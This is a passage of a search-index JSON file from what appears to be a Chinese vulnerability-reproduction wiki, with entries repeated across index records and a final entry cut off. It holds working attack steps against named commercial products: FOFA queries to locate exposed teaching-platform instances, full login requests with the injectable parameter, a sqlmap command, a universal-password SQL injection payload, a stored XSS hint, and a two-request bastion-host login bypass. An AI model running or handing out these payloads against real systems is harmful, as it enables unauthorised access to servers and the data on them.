\u516c\u8bc1\u5b9e\u52a1\u6559\u5b66\u8f6f\u4ef6 SQL\u6ce8\u5165\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E8%B7%B5%E6%95%99%E5%AD%A6%E5%B9%B3%E5%8F%B0/%E6%9D%AD%E5%B7%9E%E6%B3%95%E6%BA%90%E8%BD%AF%E4%BB%B6%20%E5%85%AC%E8%AF%81%E5%AE%9E%E5%8A%A1%E6%95%99%E5%AD%A6%E8%BD%AF%E4%BB%B6%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u676d\u5dde\u6cd5\u6e90\u8f6f\u4ef6-\u516c\u8bc1\u5b9e\u52a1\u6559\u5b66\u8f6f\u4ef6-sql\u6ce8\u5165\u6f0f\u6d1e","text":"","title":"\u676d\u5dde\u6cd5\u6e90\u8f6f\u4ef6 \u516c\u8bc1\u5b9e\u52a1\u6559\u5b66\u8f6f\u4ef6 SQL\u6ce8\u5165\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E8%B7%B5%E6%95%99%E5%AD%A6%E5%B9%B3%E5%8F%B0/%E6%9D%AD%E5%B7%9E%E6%B3%95%E6%BA%90%E8%BD%AF%E4%BB%B6%20%E5%85%AC%E8%AF%81%E5%AE%9E%E5%8A%A1%E6%95%99%E5%AD%A6%E8%BD%AF%E4%BB%B6%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u676d\u5dde\u6cd5\u6e90\u8f6f\u4ef6 \u516c\u8bc1\u5b9e\u52a1\u6559\u5b66\u8f6f\u4ef6 \u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E8%B7%B5%E6%95%99%E5%AD%A6%E5%B9%B3%E5%8F%B0/%E6%9D%AD%E5%B7%9E%E6%B3%95%E6%BA%90%E8%BD%AF%E4%BB%B6%20%E5%85%AC%E8%AF%81%E5%AE%9E%E5%8A%A1%E6%95%99%E5%AD%A6%E8%BD%AF%E4%BB%B6%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u676d\u5dde\u6cd5\u6e90\u8f6f\u4ef6 \u516c\u8bc1\u5b9e\u52a1\u6559\u5b66\u8f6f\u4ef6","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E8%B7%B5%E6%95%99%E5%AD%A6%E5%B9%B3%E5%8F%B0/%E6%9D%AD%E5%B7%9E%E6%B3%95%E6%BA%90%E8%BD%AF%E4%BB%B6%20%E5%85%AC%E8%AF%81%E5%AE%9E%E5%8A%A1%E6%95%99%E5%AD%A6%E8%BD%AF%E4%BB%B6%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#fofa","text":"[!NOTE] FOFA\u6682\u65f6\u672a\u6536\u5f55\u4efb\u4f55\u7f51\u7ad9","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E8%B7%B5%E6%95%99%E5%AD%A6%E5%B9%B3%E5%8F%B0/%E6%9D%AD%E5%B7%9E%E6%B3%95%E6%BA%90%E8%BD%AF%E4%BB%B6%20%E5%85%AC%E8%AF%81%E5%AE%9E%E5%8A%A1%E6%95%99%E5%AD%A6%E8%BD%AF%E4%BB%B6%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u767b\u5f55\u9875\u9762\u5982\u4e0b \u767b\u5f55\u6293\u53d6\u8bf7\u6c42\u5305 POST /JusNotary/ HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Length: 219 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: ASP.NET_SessionId=54zwf05sd1g4zyfpiuxxdmuc x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 Connection: close __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKMTE5NTI5NDc1Ng8WAh4TVmFsaWRhdGVSZXF1ZXN0TW9kZQIBZGTTkYMK0k4DlIElq0ua0zvxEhpFH8rCzVrUscEhlVc9pw%3D%3D&__VIEWSTATEGENERATOR=1B0004A3&txtName=123&txtPwd=123&btnSubmit=+ \u5176\u4e2d\u6ce8\u5165\u7684\u53c2\u6570\u4e3a POST\u6570\u636e\u4e2d\u7684 txtName \u53c2\u6570, \u4fdd\u5b58\u4e3a\u6587\u4ef6\u4f7f\u7528 Sqlmap\u8dd1\u4e00\u4e0b","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E8%B7%B5%E6%95%99%E5%AD%A6%E5%B9%B3%E5%8F%B0/%E6%9D%AD%E5%B7%9E%E6%B3%95%E6%BA%90%E8%BD%AF%E4%BB%B6%20%E6%B3%95%E5%BE%8B%E7%9F%A5%E8%AF%86%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","text":"\u676d\u5dde\u6cd5\u6e90\u8f6f\u4ef6 \u6cd5\u5f8b\u77e5\u8bc6\u6570\u636e\u5e93\u7cfb\u7edf SQL\u6ce8\u5165\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u676d\u5dde\u6cd5\u6e90\u8f6f\u4ef6\u5f00\u53d1\u6709\u9650\u516c\u53f8\u5f00\u53d1\u7684\u5b9e\u8df5\u6559\u5b66\u5e73\u53f0\u7cfb\u7edf\u4e0b\u7684\u6cd5\u5f8b\u77e5\u8bc6\u6570\u636e\u5e93\u7cfb\u7edf\u767b\u5f55\u524d\u53f0\u5b58\u5728\u901a\u7528SQLi\u6f0f\u6d1e \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u676d\u5dde\u6cd5\u6e90\u8f6f\u4ef6 \u6cd5\u5f8b\u77e5\u8bc6\u6570\u636e\u5e93\u7cfb\u7edf FOFA \u00b6 [!NOTE] icon_hash=\"2018105215\" || title=\"\u5b9e\u8df5\u6559\u5b66\u5e73\u53f0 - \u676d\u5dde\u6cd5\u6e90\u8f6f\u4ef6\u5f00\u53d1\u6709\u9650\u516c\u53f8\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u8fdb\u5165\u9875\u9762\u5982\u4e0b \u51fa\u73b0\u6f0f\u6d1e\u7684Url\u4e3a http://xxxxxxx/JusRepos/ui/login.aspx \u6293\u53d6\u767b\u5f55\u7684\u8bf7\u6c42\u5305 POST /JusRepos/ui/login.aspx HTTP/1.1 Host: xxx.xxx.xxx.xxxx Content-Length: 362 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: ASP.NET_SessionId=0upclbweiokwx4qnkpfzumir x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 Connection: close __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwULLTE4NTUyMzg5NDNkZBLjR6E85W4xvkheqS5g7gOsMdeop3Xfh1BwnTSCbV7z&__VIEWSTATEGENERATOR=E3BBEDB7&__EVENTVALIDATION=%2FwEdAATFHpXckaPEvZEyN%2BNhIQGTDFTzKcXJqLg%2BOeJ6QAEa2jPSlu16Yx4QbiDU%2BdddK1MwoKxxc3z27YmfD4jI4gVsV9%2FpN02jZyPKj4JeL7G5UVenPtL%2FK1en7XvhZG5vyHk%3D&txtUser=admin&txtPwd=123&btnSub=%E7%99%BB%E5%BD%95 \u5176\u4e2d\u6ce8\u5165\u7684\u53c2\u6570\u4e3a POST\u6570\u636e\u4e2d\u7684 txtUser \u53c2\u6570, \u4fdd\u5b58\u4e3a\u6587\u4ef6\u4f7f\u7528 Sqlmap\u8dd1\u4e00\u4e0b sqlmap -r sql.txt -p txtUser \u540c\u65f6\u8fd8\u5b58\u5728\u7740\u4e07\u80fd\u5bc6\u7801\u53ef\u4ee5\u76f4\u63a5\u767b\u5f55\u540e\u53f0 user: 1' or 1=1 -- pass: peiqi","title":"\u676d\u5dde\u6cd5\u6e90\u8f6f\u4ef6 \u6cd5\u5f8b\u77e5\u8bc6\u6570\u636e\u5e93\u7cfb\u7edf SQL\u6ce8\u5165\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E8%B7%B5%E6%95%99%E5%AD%A6%E5%B9%B3%E5%8F%B0/%E6%9D%AD%E5%B7%9E%E6%B3%95%E6%BA%90%E8%BD%AF%E4%BB%B6%20%E6%B3%95%E5%BE%8B%E7%9F%A5%E8%AF%86%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u676d\u5dde\u6cd5\u6e90\u8f6f\u4ef6-\u6cd5\u5f8b\u77e5\u8bc6\u6570\u636e\u5e93\u7cfb\u7edf-sql\u6ce8\u5165\u6f0f\u6d1e","text":"","title":"\u676d\u5dde\u6cd5\u6e90\u8f6f\u4ef6 \u6cd5\u5f8b\u77e5\u8bc6\u6570\u636e\u5e93\u7cfb\u7edf SQL\u6ce8\u5165\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E8%B7%B5%E6%95%99%E5%AD%A6%E5%B9%B3%E5%8F%B0/%E6%9D%AD%E5%B7%9E%E6%B3%95%E6%BA%90%E8%BD%AF%E4%BB%B6%20%E6%B3%95%E5%BE%8B%E7%9F%A5%E8%AF%86%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u676d\u5dde\u6cd5\u6e90\u8f6f\u4ef6\u5f00\u53d1\u6709\u9650\u516c\u53f8\u5f00\u53d1\u7684\u5b9e\u8df5\u6559\u5b66\u5e73\u53f0\u7cfb\u7edf\u4e0b\u7684\u6cd5\u5f8b\u77e5\u8bc6\u6570\u636e\u5e93\u7cfb\u7edf\u767b\u5f55\u524d\u53f0\u5b58\u5728\u901a\u7528SQLi\u6f0f\u6d1e","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E8%B7%B5%E6%95%99%E5%AD%A6%E5%B9%B3%E5%8F%B0/%E6%9D%AD%E5%B7%9E%E6%B3%95%E6%BA%90%E8%BD%AF%E4%BB%B6%20%E6%B3%95%E5%BE%8B%E7%9F%A5%E8%AF%86%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u676d\u5dde\u6cd5\u6e90\u8f6f\u4ef6 \u6cd5\u5f8b\u77e5\u8bc6\u6570\u636e\u5e93\u7cfb\u7edf","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E8%B7%B5%E6%95%99%E5%AD%A6%E5%B9%B3%E5%8F%B0/%E6%9D%AD%E5%B7%9E%E6%B3%95%E6%BA%90%E8%BD%AF%E4%BB%B6%20%E6%B3%95%E5%BE%8B%E7%9F%A5%E8%AF%86%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#fofa","text":"[!NOTE] icon_hash=\"2018105215\" || title=\"\u5b9e\u8df5\u6559\u5b66\u5e73\u53f0 - \u676d\u5dde\u6cd5\u6e90\u8f6f\u4ef6\u5f00\u53d1\u6709\u9650\u516c\u53f8\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E8%B7%B5%E6%95%99%E5%AD%A6%E5%B9%B3%E5%8F%B0/%E6%9D%AD%E5%B7%9E%E6%B3%95%E6%BA%90%E8%BD%AF%E4%BB%B6%20%E6%B3%95%E5%BE%8B%E7%9F%A5%E8%AF%86%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u8fdb\u5165\u9875\u9762\u5982\u4e0b \u51fa\u73b0\u6f0f\u6d1e\u7684Url\u4e3a http://xxxxxxx/JusRepos/ui/login.aspx \u6293\u53d6\u767b\u5f55\u7684\u8bf7\u6c42\u5305 POST /JusRepos/ui/login.aspx HTTP/1.1 Host: xxx.xxx.xxx.xxxx Content-Length: 362 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: ASP.NET_SessionId=0upclbweiokwx4qnkpfzumir x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 Connection: close __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwULLTE4NTUyMzg5NDNkZBLjR6E85W4xvkheqS5g7gOsMdeop3Xfh1BwnTSCbV7z&__VIEWSTATEGENERATOR=E3BBEDB7&__EVENTVALIDATION=%2FwEdAATFHpXckaPEvZEyN%2BNhIQGTDFTzKcXJqLg%2BOeJ6QAEa2jPSlu16Yx4QbiDU%2BdddK1MwoKxxc3z27YmfD4jI4gVsV9%2FpN02jZyPKj4JeL7G5UVenPtL%2FK1en7XvhZG5vyHk%3D&txtUser=admin&txtPwd=123&btnSub=%E7%99%BB%E5%BD%95 \u5176\u4e2d\u6ce8\u5165\u7684\u53c2\u6570\u4e3a POST\u6570\u636e\u4e2d\u7684 txtUser \u53c2\u6570, \u4fdd\u5b58\u4e3a\u6587\u4ef6\u4f7f\u7528 Sqlmap\u8dd1\u4e00\u4e0b sqlmap -r sql.txt -p txtUser \u540c\u65f6\u8fd8\u5b58\u5728\u7740\u4e07\u80fd\u5bc6\u7801\u53ef\u4ee5\u76f4\u63a5\u767b\u5f55\u540e\u53f0 user: 1' or 1=1 -- pass: peiqi","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E8%B7%B5%E6%95%99%E5%AD%A6%E5%B9%B3%E5%8F%B0/%E6%9D%AD%E5%B7%9E%E6%B3%95%E6%BA%90%E8%BD%AF%E4%BB%B6%20%E6%B3%95%E5%BE%8B%E7%9F%A5%E8%AF%86%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%20%E5%90%8E%E5%8F%B0XSS%E6%BC%8F%E6%B4%9E/","text":"\u676d\u5dde\u6cd5\u6e90\u8f6f\u4ef6 \u6cd5\u5f8b\u77e5\u8bc6\u6570\u636e\u5e93\u7cfb\u7edf \u540e\u53f0XSS\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u676d\u5dde\u6cd5\u6e90\u8f6f\u4ef6\u5f00\u53d1\u6709\u9650\u516c\u53f8\u5f00\u53d1\u7684\u5b9e\u8df5\u6559\u5b66\u5e73\u53f0\u7cfb\u7edf\u4e0b\u7684\u6cd5\u5f8b\u77e5\u8bc6\u6570\u636e\u5e93\u7cfb\u7edf\u767b\u5f55\u540e\u53f0\u7528\u6237\u540d\u5904\u5b58\u5728\u901a\u7528XSS\u6f0f\u6d1e \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u676d\u5dde\u6cd5\u6e90\u8f6f\u4ef6 \u6cd5\u5f8b\u77e5\u8bc6\u6570\u636e\u5e93\u7cfb\u7edf FOFA \u00b6 [!NOTE] icon_hash=\"2018105215\" || title=\"\u5b9e\u8df5\u6559\u5b66\u5e73\u53f0 - \u676d\u5dde\u6cd5\u6e90\u8f6f\u4ef6\u5f00\u53d1\u6709\u9650\u516c\u53f8\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u767b\u5f55\u540e\u53f0\u540e\u66f4\u6539\u7528\u6237\u540d\uff0c\u4f7f\u7528 td\u6807\u7b7e \u95ed\u5408","title":"\u676d\u5dde\u6cd5\u6e90\u8f6f\u4ef6 \u6cd5\u5f8b\u77e5\u8bc6\u6570\u636e\u5e93\u7cfb\u7edf \u540e\u53f0XSS\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E8%B7%B5%E6%95%99%E5%AD%A6%E5%B9%B3%E5%8F%B0/%E6%9D%AD%E5%B7%9E%E6%B3%95%E6%BA%90%E8%BD%AF%E4%BB%B6%20%E6%B3%95%E5%BE%8B%E7%9F%A5%E8%AF%86%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%20%E5%90%8E%E5%8F%B0XSS%E6%BC%8F%E6%B4%9E/#\u676d\u5dde\u6cd5\u6e90\u8f6f\u4ef6-\u6cd5\u5f8b\u77e5\u8bc6\u6570\u636e\u5e93\u7cfb\u7edf-\u540e\u53f0xss\u6f0f\u6d1e","text":"","title":"\u676d\u5dde\u6cd5\u6e90\u8f6f\u4ef6 \u6cd5\u5f8b\u77e5\u8bc6\u6570\u636e\u5e93\u7cfb\u7edf \u540e\u53f0XSS\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E8%B7%B5%E6%95%99%E5%AD%A6%E5%B9%B3%E5%8F%B0/%E6%9D%AD%E5%B7%9E%E6%B3%95%E6%BA%90%E8%BD%AF%E4%BB%B6%20%E6%B3%95%E5%BE%8B%E7%9F%A5%E8%AF%86%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%20%E5%90%8E%E5%8F%B0XSS%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u676d\u5dde\u6cd5\u6e90\u8f6f\u4ef6\u5f00\u53d1\u6709\u9650\u516c\u53f8\u5f00\u53d1\u7684\u5b9e\u8df5\u6559\u5b66\u5e73\u53f0\u7cfb\u7edf\u4e0b\u7684\u6cd5\u5f8b\u77e5\u8bc6\u6570\u636e\u5e93\u7cfb\u7edf\u767b\u5f55\u540e\u53f0\u7528\u6237\u540d\u5904\u5b58\u5728\u901a\u7528XSS\u6f0f\u6d1e","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E8%B7%B5%E6%95%99%E5%AD%A6%E5%B9%B3%E5%8F%B0/%E6%9D%AD%E5%B7%9E%E6%B3%95%E6%BA%90%E8%BD%AF%E4%BB%B6%20%E6%B3%95%E5%BE%8B%E7%9F%A5%E8%AF%86%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%20%E5%90%8E%E5%8F%B0XSS%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u676d\u5dde\u6cd5\u6e90\u8f6f\u4ef6 \u6cd5\u5f8b\u77e5\u8bc6\u6570\u636e\u5e93\u7cfb\u7edf","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E8%B7%B5%E6%95%99%E5%AD%A6%E5%B9%B3%E5%8F%B0/%E6%9D%AD%E5%B7%9E%E6%B3%95%E6%BA%90%E8%BD%AF%E4%BB%B6%20%E6%B3%95%E5%BE%8B%E7%9F%A5%E8%AF%86%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%20%E5%90%8E%E5%8F%B0XSS%E6%BC%8F%E6%B4%9E/#fofa","text":"[!NOTE] icon_hash=\"2018105215\" || title=\"\u5b9e\u8df5\u6559\u5b66\u5e73\u53f0 - \u676d\u5dde\u6cd5\u6e90\u8f6f\u4ef6\u5f00\u53d1\u6709\u9650\u516c\u53f8\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E8%B7%B5%E6%95%99%E5%AD%A6%E5%B9%B3%E5%8F%B0/%E6%9D%AD%E5%B7%9E%E6%B3%95%E6%BA%90%E8%BD%AF%E4%BB%B6%20%E6%B3%95%E5%BE%8B%E7%9F%A5%E8%AF%86%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%20%E5%90%8E%E5%8F%B0XSS%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u767b\u5f55\u540e\u53f0\u540e\u66f4\u6539\u7528\u6237\u540d\uff0c\u4f7f\u7528 td\u6807\u7b7e \u95ed\u5408","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A6%8F%E8%BF%AA%E5%A0%A1%E5%9E%92%E6%9C%BA/%E6%80%9D%E7%A6%8F%E8%BF%AA%E5%A0%A1%E5%9E%92%E6%9C%BA%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/","text":"\u601d\u798f\u8fea\u5821\u5792\u673a \u4efb\u610f\u2f64\u6237\u767b\u5f55\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u601d\u798f\u8fea\u5821\u5792\u673a\u5b58\u5728\u4efb\u610f\u2f64\u6237\u767b\u5f55\u6f0f\u6d1e\uff0c\u6076\u610f\u653b\u51fb\u8005\u53ef\u4ee5\u7ed5\u8fc7\u5821\u5792\u673a\u7684\u5bc6\u7801\u767b\u5f55\u9a8c\u8bc1\u673a\u5236\uff0c\u4ee5\u4efb \u610f\u2f64\u6237\u8eab\u4efd\u968f\u610f\u767b\u5f55\u5821\u5792\u673aWeb\u7ba1\u7406\u754c\u2faf\uff0c\u5e76\u53ef\u4ee5\u6b63\u5e38\u7684\u4f7f\u2f64\u8d26\u6237\u6743\u9650\u53bb\u64cd\u4f5c\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u601d\u798f\u8fea\u5821\u5792\u673a FOFA \u00b6 [!NOTE] \"Logbase\u8fd0\u7ef4\u5b89\u5168\u7ba1\u7406\u7cfb\u7edf\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u83b7\u53d6INFO\u5b57\u6bb5\uff0cu1\u53c2\u6570\u503c\u4e3a\u2f64\u6237\u540d POST /bhost/set_session HTTP/1.1 Host: xxx.xxx.xxx.xx u1=admin&m1= \u83b7\u5f97\uff1a {\"result\":true,\"info\":\"1562205376847\",\"ErrMsg\":\"\"} \u5e26\u2f0aINFO\u5b57\u6bb5\u8fdb\u2f0a\u5982\u4e0b\u8bf7\u6c42\u7684 a0 \u53c2\u6570\u503c\u4e2d,uCode\u53c2\u6570\u503c\u4e3a\u2f64\u6237\u540d POST /bhost/login_link HTTP/1.1 Host: xxx.xxx.xxx.xxx a0=1562205376847&a1=&a10=2019-01- 01+10:10:10&ha=CADFDF26E649FB6284D2FD424BD294B6&uCode=admin&vdcode= \u5229\u7528\u540e\u5373\u53ef\u767b\u5f55\u540e\u53f0","title":"\u601d\u798f\u8fea\u5821\u5792\u673a \u4efb\u610f\u7528\u6237\u767b\u5f55\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A6%8F%E8%BF%AA%E5%A0%A1%E5%9E%92%E6%9C%BA/%E6%80%9D%E7%A6%8F%E8%BF%AA%E5%A0%A1%E5%9E%92%E6%9C%BA%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/#\u601d\u798f\u8fea\u5821\u5792\u673a-\u4efb\u610f\u6237\u767b\u5f55\u6f0f\u6d1e","text":"","title":"\u601d\u798f\u8fea\u5821\u5792\u673a \u4efb\u610f\u2f64\u6237\u767b\u5f55\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A6%8F%E8%BF%AA%E5%A0%A1%E5%9E%92%E6%9C%BA/%E6%80%9D%E7%A6%8F%E8%BF%AA%E5%A0%A1%E5%9E%92%E6%9C%BA%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u601d\u798f\u8fea\u5821\u5792\u673a\u5b58\u5728\u4efb\u610f\u2f64\u6237\u767b\u5f55\u6f0f\u6d1e\uff0c\u6076\u610f\u653b\u51fb\u8005\u53ef\u4ee5\u7ed5\u8fc7\u5821\u5792\u673a\u7684\u5bc6\u7801\u767b\u5f55\u9a8c\u8bc1\u673a\u5236\uff0c\u4ee5\u4efb \u610f\u2f64\u6237\u8eab\u4efd\u968f\u610f\u767b\u5f55\u5821\u5792\u673aWeb\u7ba1\u7406\u754c\u2faf\uff0c\u5e76\u53ef\u4ee5\u6b63\u5e38\u7684\u4f7f\u2f64\u8d26\u6237\u6743\u9650\u53bb\u64cd\u4f5c\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A6%8F%E8%BF%AA%E5%A0%A1%E5%9E%92%E6%9C%BA/%E6%80%9D%E7%A6%8F%E8%BF%AA%E5%A0%A1%E5%9E%92%E6%9C%BA%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] 